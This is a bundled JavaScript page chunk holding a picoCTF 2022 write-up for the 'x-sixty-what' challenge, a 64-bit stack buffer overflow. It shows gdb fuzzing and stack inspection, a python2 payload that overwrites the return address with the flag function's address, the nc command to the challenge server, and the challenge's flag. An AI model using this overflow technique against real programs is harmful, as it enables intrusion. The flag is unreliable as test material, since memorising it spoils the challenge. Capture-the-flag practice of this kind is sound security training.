"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[39548],{62430:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>o,contentTitle:()=>f,default:()=>l,frontMatter:()=>r,metadata:()=>a,toc:()=>s});var U=t(74848),i=t(28453);const r={},f="x-sixty-what",a={permalink:"/blog/pico_2022/binary_exploitation/x-sixty-what/README",source:"@site/blog/pico_2022/binary_exploitation/x-sixty-what/README.md",title:"x-sixty-what",description:"Description",date:"2024-09-26T20:55:31.413Z",tags:[],readingTime:1.805,hasTruncateMarker:!1,authors:[],frontMatter:{},unlisted:!1,prevItem:{title:"RPS",permalink:"/blog/pico_2022/binary_exploitation/rps/README"},nextItem:{title:"credstuf",permalink:"/blog/pico_2022/cryptography/credstuff/README"}},o={authorsImageUrls:[]},s=[{value:"Description",id:"description",level:2},{value:"Fuzzing",id:"fuzzing",level:2},{value:"Stack",id:"stack",level:2}];function c(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,U.jsxs)(U.Fragment,{children:[(0,U.jsx)(e.h2,{id:"description",children:"Description"}),"\n",(0,U.jsx)(e.p,{children:"Overflow x64 code"}),"\n",(0,U.jsxs)(e.p,{children:["Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this ",(0,U.jsx)(e.a,{href:"https://artifacts.picoctf.net/c/192/vuln",children:"program"}),"."]}),"\n",(0,U.jsxs)(e.p,{children:["Download ",(0,U.jsx)(e.a,{href:"https://artifacts.picoctf.net/c/192/vuln.c",children:"source"})]}),"\n",(0,U.jsx)(e.pre,{children:(0,U.jsx)(e.code,{className:"language-bash",children:"nc saturn.picoctf.net 50079\n"})}),"\n",(0,U.jsx)(e.h2,{id:"fuzzing",children:"Fuzzing"}),"\n",(0,U.jsxs)(e.p,{children:["We notice that ",(0,U.jsx)(e.code,{children:"#define BUFFSIZE 64"})," so we can crash it immediataly by:"]}),"\n",(0,U.jsx)(e.pre,{children:(0,U.jsx)(e.code,{className:"language-bash",children:"python2 -c \"print('U' * 64 + '1234')\"\nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234\n\n\ngdb ./vuln-64\nReading symbols from ./vuln-64...\n\n(gdb) b *(vuln +29)\nBreakpoint 1 at 0x401ece: file vuln.c, line 26.\n\n(gdb) r\nStarting program: vuln-64 \nWelcome to 64-bit. Give me a string that gets you the flag: \nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234\n\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\nmain (argc=<error reading variable: Cannot access memory at address 0x7f0034333225>, \n    argv=<error reading variable: Cannot access memory at address 0x7f0034333219>) at vuln.c:36\n"})}),"\n",(0,U.jsx)(e.h2,{id:"stack",children:"Stack"}),"\n",(0,U.jsx)(e.pre,{children:(0,U.jsx)(e.code,{children:"(gdb) i r $rsp\nrsp            0x7fffffffd698      0x7fffffffd698\n(gdb) i r $rbp\nrbp            0x7fffffffd6d8      0x7fffffffd6d8\n"})}),"\n",(0,U.jsx)(e.p,{children:"So the size is 64 in decimal."}),"\n",(0,U.jsx)(e.p,{children:"Send a payload with 6 digits:"}),"\n",(0,U.jsx)(e.pre,{children:(0,U.jsx)(e.code,{children:"(gdb) r\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: vuln-64 \nWelcome to 64-bit. Give me a string that gets you the flag: \nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUAAAAAA\n\nBreakpoint 1, vuln () at vuln.c:26\n26      }\n(gdb) x/20xg $rsp\n0x7fffffffd698: 0x5555555555555555      0x5555555555555555\n0x7fffffffd6a8: 0x5555555555555555      0x5555555555555555\n0x7fffffffd6b8: 0x5555555555555555      0x5555555555555555\n0x7fffffffd6c8: 0x5555555555555555      0x5555555555555555\n0x7fffffffd6d8: 0x0000414141414141      0x0000000000401f37\n0x7fffffffd6e8: 0x00007fffffffd838      0x0000000100000000\n0x7fffffffd6f8: 0x000003e8004c1018      0x0000000000402f20\n0x7fffffffd708: 0x0000000000402750      0x0000000000000000\n0x7fffffffd718: 0x0000000100000000      0x00007fffffffd838\n0x7fffffffd728: 0x0000000000401ed1      0x0000000000000000\n\n"})}),"\n",(0,U.jsxs)(e.p,{children:["Locally, when running agains our own compiled version of ",(0,U.jsx)(e.code,{children:"./vuln.c"}),", we're able to retrieve the debug flag:"]}),"\n",(0,U.jsx)(e.pre,{children:(0,U.jsx)(e.code,{className:"language-bash",children:"python2 -c \"print('U' * 72 + '\\x35\\x1e\\x40')\" | ./vuln-64\nWelcome to 64-bit. Give me a string that gets you the flag: \npicoCTF{some_flag}\n[1]    222188 done                              python2 -c \"print('U' * 72 + '\\x35\\x1e\\x40')\" | \n       222189 segmentation fault (core dumped)  ./vuln-64\n\n"})}),"\n",(0,U.jsx)(e.p,{children:"Finally got it to work after seeing the 2nd hint:"}),"\n",(0,U.jsxs)(e.blockquote,{children:["\n",(0,U.jsx)(e.p,{children:"Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults."}),"\n"]}),"\n",(0,U.jsx)(e.pre,{children:(0,U.jsx)(e.code,{className:"language-bash",children:"cat <(python2 -c \"print('U' * 72 + '\\x3b\\x12\\x40')\") - | nc saturn.picoctf.net 52707\nWelcome to 64-bit. Give me a string that gets you the flag: \npicoCTF{b1663r_15_b3773r_11c407bc}\n"})})]})}function l(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,U.jsx)(e,{...n,children:(0,U.jsx)(c,{...n})}):c(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>f,x:()=>a});var U=t(96540);const i={},r=U.createContext(i);function f(n){const e=U.useContext(r);return U.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:f(n.components),U.createElement(r.Provider,{value:e},n.children)}}}]);